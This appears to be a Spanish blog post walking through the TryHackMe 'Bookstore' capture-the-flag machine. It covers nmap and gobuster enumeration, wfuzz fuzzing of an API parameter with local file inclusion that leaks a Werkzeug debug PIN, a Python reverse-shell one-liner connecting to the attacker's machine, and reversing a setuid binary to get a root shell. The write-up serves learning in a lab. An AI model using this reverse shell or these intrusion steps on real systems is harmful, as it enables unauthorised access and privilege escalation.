---
layout: post
title: Bookstore | THM Write-up
description: Write up de la máquina Bookstore de la plataforma Try Hack Me
tags: [ write-ups , seguridad , TryHackMe, Fuzzing ]
---

# Indice
1. [Introducción](#introduction)

2. [Reconocimiento](#reconocimiento)
    1. [nmap](#nmap)
    2. [gobuster](#gobuster)
    3. [wfuzz](#wfuzz)
3. [Reverse Shell con Python](#reverse-shell)
4. [Un poco de ingeniería inversa](#ingenieria-inversa) 


# Introducción <a id="introduction"></a>

En la descripción de la máquina que voy a intentar hoy [(Bookstore de Try Hack Me)](https://tryhackme.com/room/bookstoreoc) dice que nos enseña algunos de los principios de enumeración web y fuzzing de RestAPI. Deduzco pues que vamos a trabajar con nmap, gobuster y wfuzz, pero en este tipo de retos siempre hay más sorpresas.


# Reconocimiento <a id="reconocimiento"></a>

## nmap<a id="nmap"></a>

Empiezo con un nmap básico para buscar puertos abiertos

```
nmap -sS --min-rate 5000 -p- --open -v -n -Pn IPDELAMAQUINA
```

El escaneo devuelve varios resultado: puertos 22, 80 y 5000 están abiertos. El 22 y 80 son conocidos (ssh y http) pero el 5000 cuenta con un servicio upnp que, según google corresponde a:
> “Universal Plug N' Play (UPnP) devices to accept incoming connections from other UPnP devices”. 

También en google me aparecen resultados relativos a explotar vulnerabilidades con metasploit, pero prefiero intentar herramientas más manuales, al menos al principio. 

Entro en la web mediante mi navegador por el puerto 5000 (http://IPDELAMAQUINA:5000) y recibo como respuesta:

>Foxy REST API v2.0
>This is a REST API for science fiction novels.

## gobuster<a id="gobuster"></a>

Tiro de gobuster para obtener más información:
```bash
gobuster dir -u http://IPDELAMAQUINA -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
````

Veo que hay varios directorios: 
>/images, /assets, /javascript y /server-status. 

Empiezo por /assets y descubro una carpeta /js con un archivo /api.js entre otros. Este parece el más interesante, así que lo abro. Se trata de un javascript que básicamente llama a una url y hace un fetch en formato json. Es decir, se trata de la API. 
```javascript
var u=getAPIURL();
let url = 'http://' + u + '/api/v2/resources/books/random4';
```

y luego tiene un comentario interesante, 
> //the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure. 

Parece por tanto que si navego a http://IPDELAMAQUINA:5000/api/v1/resources/books/random4 podré intentar un vector de ataque con un local file inclusion. En principio esta web no existe, pero intento encontrar mediante el navegador la v1 de la api. Y encuentro un resultado interesante en 
http://IPDELAMAQUINA:5000/api/ 

>API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:
/api/v2/resources/books/all (Retrieve all books and get the output in a json format)
/api/v2/resources/books/random4 (Retrieve 4 random records)
/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)
/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)
/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)

La versión v1 de estas rutas funciona. Así que parece que me voy acercando al parámetro mediante el cual podemos hacer un file inclusion. 

Al mismo tiempo que investigaba mediante el navegador y encontraba el directorio de la api, estoy volviendo a listar directorios ocultos, pero esta vez en el puerto 5000 con
gobuster dir -u http://IPDELAMAQUINA:5000 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64

Aparecen los directorios /api (que ya había encontrado) y /console. Navego a este segundo y aparece una consola con un pop-up que dice:

>“Console Locked

>The console is locked and needs to be unlocked by entering the PIN. You can find the PIN printed out on the standard output of your shell that runs the server.“ 

Intento deshabilitar ese pequeño pop-up editando la hoja de estilos ( cambiando el sytle=”display:block” a style=”display:none”) . Pero desafortunadamente no puedo ejecutar comandos en la consola, así que tendré que buscar el PIN. 

Intento acotar navegando en las diferentes páginas y escribiendo el comando siguente en la consola del navegador:

```javascript
document.body.innerHTML.indexOf(“pin”)
```

Con esto intento averigüar si el pin está oculto en el código HTML, o cualquier otra pista que me ayude a avanzar. Y parece que encuentro algo:

> Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file

Con esto y la posible vulnerabilidad de la v1 de la API tengo para empezar a buscar con wfuzz. 

## wfuzz<a id="wfuzz"></a>

```
wfuzz -u http://IPDELAMAQUINA:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 
```

Podía haber utilizado otro diccionario, pero me la juego a que el parámetro que busco tiene 4 letras o números. Sin embargo, no recomiendo hacer esto, utilizad un diccionario apropiado.

Por fin encuentro el parámetro que andábamos buscando. Navego a http://IPDELAMAQUINA:5000/api/v1/resources/books?****=.bash_history

> cd /home/sid whoami export WERKZEUG_DEBUG_PIN=***-***-*** echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit

# Reverse Shell con Python<a id="reverse-shell"></a>

Una vez tengo acceso a la consola me indica que puedo ejecutar comandos de python. Tan sólo tengo que buscar una manera de hacer un reverse shell y apuntar a un puerto de mi máquina local desde donde estaré escuchando .Para ello elijo el puerto 4242. En una terminal de mi máquina local escribo:
```
nc -lvnp 4242
```

Y gracias al fantástico repositorio de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python), busco la manera de hacer un reverse shell con python. En concreto:

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPDEMIMAQUINALOCAL",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```

Y ya tengo acceso a la máquina desde mi terminal. Encuentro el fichero `user.txt` y con ello la primera flag. 

Hay otro archivo `try-harder`que tiene toda la pinta de ser la clave para convertirnos en usuario root.

Me bajo try-harder tras haber creado un servidor por el puerto 1234 en la máquina atacada (la de Bookstore) con: 

````
python3 -m http.server 1234
````
y luego desde una terminal en mi máquina local:

```
wget <IPDELAMAQUINA>:1234/try-harder
```

*** no hagais esto sin estabilizar la shell antes. Se me olvidó hacerlo a mi y fue un fastidio porque tuve que reiniciar la máquina más adelante, ya que no me dejaba ejecutar comandos como Ctrl + C. Es tan sencillo como  

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Luego CRTL+z para mandar el proceso al background. 

Desde mi máquina local haré:

```
stty raw -echo
fg
```

Y presiono ENTER dos veces.

Vuelvo a la máquina atacada (Bookstore) y:

```
export TERM=xterm
```
***

# Un poco de ingeniería inversa<a id="ingenieria-inversa"></a>

Con file try-harder descubro que se trata de un `ELF 64-bit LSB shared object`. Es decir un ejecutable. Cambio el permiso de ejecución con `chmod +x`y lo ejecuto.


> What´s The Magic Number?! 

Ahora hay que adivinar un número mágico. Intento decompilar el ejecutable con Ghidra, y tras un buen rato descubro lo siguiente (si tienes problemas, importa el archivo y bajo Symbol Tree -> main . Mira en la pestaña Decompile)

```javascript
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
 
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

No miento si digo que este proceso me está llevando horas. Pero en fin, conozco que:

- local_14 tiene que ser igual a 0x5dcd21f4
- local_18 = 0x5db3;
- local1c no lo conozco.
- local_10 no lo conozco.

Pero si 0x5dcd21f4 = local_1c ^ 0x1116 ^ 0x5db3 
entonces local_1c = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3 

Hago la operación con python 

```
python3
0x5dcd21f4 ^ 0x1116 ^ 0x5db3
```

Y me devuelve un valor. Ejecuto `try-harder` en la máquina Bookstore, introduzco el valor y listo. Tan sólo queda leer el archivo `root/root.txt`y encontrar la segunda flag.



